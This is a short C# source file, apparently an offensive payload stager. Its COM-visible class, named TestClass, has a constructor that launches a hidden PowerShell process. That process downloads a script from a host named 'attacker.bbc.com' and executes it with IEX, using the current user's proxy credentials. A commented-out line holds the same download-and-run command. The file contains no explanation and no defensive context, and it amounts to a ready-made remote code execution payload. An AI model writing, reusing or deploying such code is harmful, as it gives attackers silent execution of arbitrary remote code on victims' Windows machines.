using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass { 
    public TestClass() {
    //public static void Main() {
        //Process.Start("powershell.exe -nop -w hidden -c \"$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; IEX ( $browser.downloadstring('http://attacker.bbc.com:80/a') ) \"");
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "powershell.EXE";
        startInfo.Arguments = " -nop -w hidden -c \"$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; IEX ( $browser.downloadstring('http://attacker.bbc.com:80/a') ) \"";
        Process.Start(startInfo);
    }
}
